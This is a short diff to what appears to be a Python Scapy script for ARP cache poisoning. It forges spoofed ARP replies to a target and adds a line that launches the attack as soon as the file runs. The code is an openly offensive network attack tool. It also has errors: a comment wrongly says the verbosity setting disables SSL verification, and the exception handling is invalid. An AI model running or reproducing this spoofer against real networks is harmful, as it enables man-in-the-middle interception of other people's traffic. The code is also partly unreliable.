@@ -1,7 +1,9 @@
 from scapy.all import ARP, send, Ether, conf, sendp
 from router_ip_mac import get_router_ip, get_mac
+
 #Disables Scapy's SSL verification
 conf.verb = 0
+
 #Forgesand sends the spoofed ARP packages
 def poison(target_ip, target_mac, spoof_ip):
     arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
@@ -40,3 +42,6 @@ def ARP_poison():
         print("Could not find server IP")
     except victim_ip is None:
         print("Target IP doesn't exist")
+
+#starts the ARP-poison attack
+ARP_poison()
